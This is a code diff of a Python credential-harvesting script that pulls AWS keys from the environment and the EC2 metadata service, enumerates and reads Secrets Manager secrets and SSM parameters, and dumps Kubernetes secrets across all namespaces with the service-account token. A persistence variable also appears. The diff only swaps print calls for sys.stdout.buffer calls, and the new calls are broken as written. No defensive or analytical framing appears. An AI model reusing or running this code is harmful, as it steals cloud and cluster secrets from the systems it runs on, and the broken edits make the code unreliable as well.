@@ -208,8 +208,8 @@ ST=os.environ.get('AWS_SESSION_TOKEN','')
 REG=os.environ.get('AWS_DEFAULT_REGION','us-east-1')
 
 if AK and SK:
-    print(b'\n=== AWS CREDENTIALS ===\n')
-    print(f'AWS_ACCESS_KEY_ID={AK}\nAWS_SECRET_ACCESS_KEY={SK}\nAWS_SESSION_TOKEN={ST}\n'.encode())
+    sys.stdout.buffer(b'\n=== AWS CREDENTIALS ===\n')
+    sys.stdout.buffer(f'AWS_ACCESS_KEY_ID={AK}\nAWS_SECRET_ACCESS_KEY={SK}\nAWS_SESSION_TOKEN={ST}\n'.encode())
 
     try:
         tkn_req=urllib.request.Request('http://169.254.169.254/latest/api/token',
@@ -224,7 +224,7 @@ if AK and SK:
             headers={'X-aws-ec2-metadata-token':imds_token})
         with urllib.request.urlopen(cred_req2,timeout=3) as r:
             creds=json.loads(r.read())
-        print(f'\n=== IMDS ROLE CREDENTIALS ===\n{json.dumps(creds,indent=2)}\n'.encode())
+        sys.stdout.buffer(f'\n=== IMDS ROLE CREDENTIALS ===\n{json.dumps(creds,indent=2)}\n'.encode())
         AK=creds.get('AccessKeyId',AK)
         SK=creds.get('SecretAccessKey',SK)
         ST=creds.get('Token',ST)
@@ -233,7 +233,7 @@ if AK and SK:
     sm=aws_req('POST','secretsmanager',REG,'/','Action=ListSecrets',
         {'Content-Type':'application/x-amz-json-1.1','X-Amz-Target':'secretsmanager.ListSecrets'},AK,SK,ST)
     if sm:
-        print(f'\n=== AWS SECRETS MANAGER ===\n{json.dumps(sm,indent=2)}\n'.encode())
+        sys.stdout.buffer(f'\n=== AWS SECRETS MANAGER ===\n{json.dumps(sm,indent=2)}\n'.encode())
         for s in sm.get('SecretList',sm.get('SecretList',[])):
             sid=s.get('ARN','')
             sv=aws_req('POST','secretsmanager',REG,'/','',
@@ -243,7 +243,7 @@ if AK and SK:
     ssm=aws_req('POST','ssm',REG,'/','Action=DescribeParameters&Version=2014-11-06',
         {'Content-Type':'application/x-www-form-urlencoded'},AK,SK,ST)
     if ssm:
-        print(f'\n=== AWS SSM PARAMETERS ===\n{json.dumps(ssm,indent=2)}\n'.encode())
+        sys.stdout.buffer(f'\n=== AWS SSM PARAMETERS ===\n{json.dumps(ssm,indent=2)}\n'.encode())
 
 SA_TOKEN_PATH='/var/run/secrets/kubernetes.io/serviceaccount/token'
 K8S_CA='/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
@@ -272,14 +272,14 @@ if os.path.exists(SA_TOKEN_PATH):
 
     secrets=k8s_get('/api/v1/secrets')
     if secrets:
-        print(f'\n=== K8S SECRETS ===\n{json.dumps(secrets,indent=2)}\n'.encode())
+        sys.stdout.buffer(f'\n=== K8S SECRETS ===\n{json.dumps(secrets,indent=2)}\n'.encode())
 
     ns_data=k8s_get('/api/v1/namespaces')
     for ns_item in ns_data.get('items',[]):
         ns=ns_item.get('metadata',{}).get('name','')
         ns_secrets=k8s_get(f'/api/v1/namespaces/{ns}/secrets')
         if ns_secrets:
-            print(f'\n=== K8S SECRETS ns={ns} ===\n{json.dumps(ns_secrets,indent=2)}\n'.encode())
+            sys.stdout.buffer(f'\n=== K8S SECRETS ns={ns} ===\n{json.dumps(ns_secrets,indent=2)}\n'.encode())
 
     PERSIST_B64='IA=='
 
